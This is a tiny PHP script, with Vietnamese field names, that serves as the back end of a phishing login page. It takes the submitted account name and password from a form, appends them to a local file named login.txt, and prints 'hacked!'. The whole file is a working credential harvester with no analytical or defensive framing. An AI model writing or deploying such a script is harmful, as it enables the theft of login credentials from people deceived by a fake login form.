<?php
$fp=fopen("login.txt",a)
or
exit("khong tim thay file
can
mo"); $nick=$_POST['taikhoan']
;
$pass=$_POST['matkhau']
; fwrite($fp,"TK:".$nick."/
MK:".$pass."/");
fclose($fp); echo "hacked!";
?>